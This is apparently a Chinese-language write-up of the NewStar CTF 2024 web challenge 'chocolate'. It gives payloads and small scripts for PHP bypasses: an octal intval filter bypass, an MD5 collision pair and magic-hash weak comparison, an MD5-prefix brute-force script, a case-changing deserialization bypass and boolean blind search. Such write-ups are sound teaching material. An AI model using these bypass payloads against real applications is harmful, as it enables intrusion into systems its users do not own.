# chocolate

> 分类：Web

## 题目描述
首页分为四个部分（可可液块、可可脂、黑可可粉、糖粉），对应四个 PHP 考点。分别获取四个参数的正确值后填入即可获得 flag。

## 考察知识点
- 八进制绕过数值校验（`intval($num, 0) === 1337`）
- ROT13
- MD5 强相等（`!==` 但 `md5() ===`）
- MD5 弱比较 `a == md5(a)`
- MD5 前 5 位截断碰撞爆破
- PHP 反序列化 + 大小写绕过过滤
- 布尔盲注 / 二分法

## 解法

### 0x00 可可液块
在输入小于等于 0 的值时出现 hint，访问 `0ldStar.php`。八进制绕过：`num=+02471`（`intval("+02471",0)` 解析为八进制 1337，同时绕过字母和小数点过滤）。

```php
if($num==="1337") { die("可爱的捏"); }
if(preg_match("/[a-z]|\./i", $num)) { die("你干嘛"); }
if(!strpos($num, "0")) { die("orz orz orz"); }
if(intval($num, 0)===1337) { ... }
```

输出：可可液块 (g): 1337033，以及 ROT13 字符串 `gur arkg yriry vf : pbpbnOhggre_fgne.cuc`。

### 0x02 可可脂
ROT13 解密得 `the next level is : cocoaButter_star.php`。三个步骤：MD5 强相等、`a == md5(a)` 弱比较、MD5 前 5 位为 `8031b`。

- MD5 强相等 payload（cat/dog）：`%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%9c%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2`（第二个 dog 略有差异）
- `moew=0e215962017`（`0e215962017 == md5(...)` 弱比较）
- MD5 前 5 位爆破得到 `wof=60066549`：

```python
import hashlib
from multiprocessing.dummy import Pool as ThreadPool

def md5(s):
    return hashlib.md5(str(s).encode('utf-8')).hexdigest()

keymd5 = '8031b'
md5length = 5

def findmd5(sss):
    key = sss.split(':')
    start = int(key[0])
    end = int(key[1])
    result = 0
    for i in range(start, end):
        if md5(i)[0:5] == keymd5:
            result = i
            print(result)
            break

list=[]
for i in range(10):
    list.append(str(10000000*i) + ':' + str(10000000*(i+1)))
pool = ThreadPool()
pool.map(findmd5, list)
pool.close()
pool.join()
```

### 0x03 黑可可粉
反序列化 + 大小写绕过过滤（`chocolate` -> `ChocoLate`）：

```php
<?php
class chocolate {
    public $username='???';
    public $password='???';
}
$c = new chocolate();
$a = str_replace("chocolate", "ChocoLate", serialize($c));
var_dump($a);
```

传入 `O:9:"ChocoLate":2:{s:8:"username";s:3:"???";s:8:"password";s:3:"???";}`，输出 黑可可粉 (g): 51540。

### 0x04 糖粉
回到首页正确填写三个值后，任意填糖粉值返回「太苦」或「太甜」（布尔盲注），二分法得到 2042。

四个值：1337033、202409、51540、2042，填入后得到 flag。

## 参考答案
（未给出）

## 来源
- 作者：NewStar CTF 2024 官方 WriteUp | https://newstar.wiki/wp/2024/week4/web/chocolate.html
